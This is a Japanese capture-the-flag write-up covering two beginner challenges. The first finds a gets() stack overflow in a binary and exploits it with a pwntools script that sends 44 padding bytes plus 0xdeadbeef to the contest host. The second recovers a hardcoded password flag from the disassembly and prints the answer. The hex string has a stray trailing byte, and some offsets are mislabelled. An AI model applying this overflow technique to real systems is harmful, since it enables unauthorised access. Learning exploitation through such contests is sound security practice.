# [Pwn: condition]
- 問題バイナリを実行すると、以下のような動きになる。

```
$ ./condition
Please tell me your name...test
Premission denied
```

- 多分正しい文字列を入力すれば、フラグがもらえるんだろうと予測しつつGDBで解析
```
$ gdb -q condition
gdb-peda$ pdisass main
Dump of assembler code for function main:
   0x0000000000400771 <+0>:	push   rbp
   0x0000000000400772 <+1>:	mov    rbp,rsp
   0x0000000000400775 <+4>:	sub    rsp,0x30
   0x0000000000400779 <+8>:	mov    DWORD PTR [rbp-0x4],0x0
   0x0000000000400780 <+15>:	mov    edi,0x4008d8
   0x0000000000400785 <+20>:	mov    eax,0x0
   0x000000000040078a <+25>:	call   0x400600 <printf@plt>
   0x000000000040078f <+30>:	lea    rax,[rbp-0x30]
   0x0000000000400793 <+34>:	mov    rdi,rax
   0x0000000000400796 <+37>:	mov    eax,0x0
   0x000000000040079b <+42>:	call   0x400620 <gets@plt>
   0x00000000004007a0 <+47>:	cmp    DWORD PTR [rbp-0x4],0xdeadbeef
   0x00000000004007a7 <+54>:	jne    0x4007bf <main+78>
   0x00000000004007a9 <+56>:	mov    edi,0x4008f8
   0x00000000004007ae <+61>:	call   0x4005c0 <puts@plt>
   0x00000000004007b3 <+66>:	mov    edi,0x40091e
   0x00000000004007b8 <+71>:	call   0x4007d3 <read_file>
   0x00000000004007bd <+76>:	jmp    0x4007c9 <main+88>
   0x00000000004007bf <+78>:	mov    edi,0x400927
   0x00000000004007c4 <+83>:	call   0x4005c0 <puts@plt>
   0x00000000004007c9 <+88>:	mov    edi,0x0
   0x00000000004007ce <+93>:	call   0x400640 <exit@plt>
End of assembler dump.
```

- ディスアセンブル結果からわかること
    1. main+25でprintfを呼び出している。出力は"Please tell me your name..."
    2. main+42でgetsを呼び出している。標準入力をrbp-0x30のアドレスに読み込んでいる。getsは読み込む文字列の最大長を指定できないため、bofができる。
    3. main+47でrbp-0x4のアドレスに格納されている値と0xdeadbeefを比較している。
    4. rbp-0x4の値と0xdeadbeefが異なる場合、Permission deniedと表示して、プログラムを抜ける。rbp-0x4の値と0xdeadbeefが一致する場合、OK! You have permissionと表示して、flag.txtを読み込み、内容を出力する。

- exploitの方針
```
getsを呼び出しているところにbof脆弱性があるので、これを利用してrbp-0x4に0xdeadbeefを書き込む。
getsはrbp-0x30に文字列を読み込んでいるので、0x30 - 0x4 = 44文字分書き込むと、rbp-0x4に到達する。

目指すスタックの状態
---------------
rbp-0x30			0x4141414141
rbp-0x26			0x4141414141
   .				0x4141414141
   .				0x4141414141
   略
rbp-0x4			0xdeadbeef
---------------
```

- コード
```
from pwn import *

host = "pwn1.chall.beginners.seccon.jp"
port = 16268

p = remote(host, port)

payload = "A" * 44 + p64(0xdeadbeef)

print(p.recvuntil("Please tell me your name..."))
p.sendline(payload)

p.interactive()
```

----

# [Reversing Warmup SimpleAuth]

-問題バイナリの実行結果

```
$ ./simple_auth
Input Password: test
Umm...Auth failed...
```

- 上のPwnと似てる
- GDBで解析

```
$ gdb -q simple_auth
gdb-peda$ pdisass main
Dump of assembler code for function main:
   0x0000000000400792 <+0>:		push   rbp
   0x0000000000400793 <+1>:		mov    rbp,rsp
   0x0000000000400796 <+4>:		sub    rsp,0x30
   0x000000000040079a <+8>:		mov    rax,QWORD PTR fs:0x28
   0x00000000004007a3 <+17>:	mov    QWORD PTR [rbp-0x8],rax
   0x00000000004007a7 <+21>:	xor    eax,eax
   0x00000000004007a9 <+23>:	mov    edi,0x4008b4
   0x00000000004007ae <+28>:	mov    eax,0x0
   0x00000000004007b3 <+33>:	call   0x400550 <printf@plt>
   0x00000000004007b8 <+38>:	lea    rax,[rbp-0x30]
   0x00000000004007bc <+42>:	mov    rsi,rax
   0x00000000004007bf <+45>:	mov    edi,0x4008c5
   0x00000000004007c4 <+50>:	mov    eax,0x0
   0x00000000004007c9 <+55>:	call   0x400570 <__isoc99_scanf@plt>
   0x00000000004007ce <+60>:	lea    rax,[rbp-0x30]
   0x00000000004007d2 <+64>:	mov    rdi,rax
   0x00000000004007d5 <+67>:	call   0x400686 <auth>
長いので省略します。
```

1. main+33でprintf。Input Password: を出力。
2. main+55でpasswordの入力を受け取る。
3. 受け取ったパスワードを引数にしてauth関数を呼び出し。関数名的にこの関数で認証処理をしていると思われるので、この関数も解析する

```
gdb-peda$ pdisass auth
Dump of assembler code for function auth:
   0x0000000000400686 <+0>:		push   rbp
   0x0000000000400687 <+1>:		mov    rbp,rsp
   0x000000000040068a <+4>:		sub    rsp,0x50
   0x000000000040068e <+8>:		mov    QWORD PTR [rbp-0x48],rdi
   0x0000000000400692 <+12>:	mov    rax,QWORD PTR fs:0x28
   0x000000000040069b <+21>:	mov    QWORD PTR [rbp-0x8],rax
   0x000000000040069f <+25>:	xor    eax,eax
   0x00000000004006a1 <+27>:	mov    DWORD PTR [rbp-0x40],0x1
   0x00000000004006a8 <+34>:	mov    BYTE PTR [rbp-0x30],0x63
   0x00000000004006ac <+38>:	mov    BYTE PTR [rbp-0x2f],0x74
   0x00000000004006b0 <+42>:	mov    BYTE PTR [rbp-0x2e],0x66
   0x00000000004006b4 <+46>:	mov    BYTE PTR [rbp-0x2d],0x34
   0x00000000004006b8 <+50>:	mov    BYTE PTR [rbp-0x2c],0x62
   0x00000000004006bc <+54>:	mov    BYTE PTR [rbp-0x2b],0x7b
   0x00000000004006c0 <+58>:	mov    BYTE PTR [rbp-0x2a],0x72
   0x00000000004006c4 <+62>:	mov    BYTE PTR [rbp-0x29],0x65
   0x00000000004006c8 <+66>:	mov    BYTE PTR [rbp-0x28],0x76
   0x00000000004006cc <+70>:	mov    BYTE PTR [rbp-0x27],0x33
   0x00000000004006d0 <+74>:	mov    BYTE PTR [rbp-0x26],0x72
   0x00000000004006d4 <+78>:	mov    BYTE PTR [rbp-0x25],0x73
   0x00000000004006d8 <+82>:	mov    BYTE PTR [rbp-0x24],0x69
   0x00000000004006dc <+86>:	mov    BYTE PTR [rbp-0x23],0x6e
   0x00000000004006e0 <+90>:	mov    BYTE PTR [rbp-0x22],0x67
   0x00000000004006e4 <+94>:	mov    BYTE PTR [rbp-0x21],0x5f
   0x00000000004006e8 <+98>:	mov    BYTE PTR [rbp-0x20],0x70
   0x00000000004006ec <+102>:	mov    BYTE PTR [rbp-0x1f],0x34
   0x00000000004006f0 <+106>:	mov    BYTE PTR [rbp-0x1e],0x73
   0x00000000004006f4 <+110>:	mov    BYTE PTR [rbp-0x1d],0x73
   0x00000000004006f8 <+114>:	mov    BYTE PTR [rbp-0x1c],0x77
   0x00000000004006fc <+118>:	mov    BYTE PTR [rbp-0x1b],0x30
   0x0000000000400700 <+122>:	mov    BYTE PTR [rbp-0x1a],0x72
   0x0000000000400704 <+126>:	mov    BYTE PTR [rbp-0x19],0x64
   0x0000000000400708 <+130>:	mov    BYTE PTR [rbp-0x18],0x7d
   0x000000000040070c <+134>:	mov    rax,QWORD PTR [rbp-0x48]
   0x0000000000400710 <+138>:	mov    rdi,rax
   0x0000000000400713 <+141>:	call   0x400530 <strlen@plt>
長いので省略します。
```

- main+34からmain+130まで1文字ずつ変数に保存している。これがFlag。
- 省略したところは、入力文字列と上のFlagがあってるかどうか検証してる
- 文字を抜き出して繋げるとFlagになる

```
flag = "63746634627b726576337273696e675f70347373773072647d48"
print(flag.decode("hex"))
```

- Flag:ctf4b{rev3rsing_p4ssw0rd}
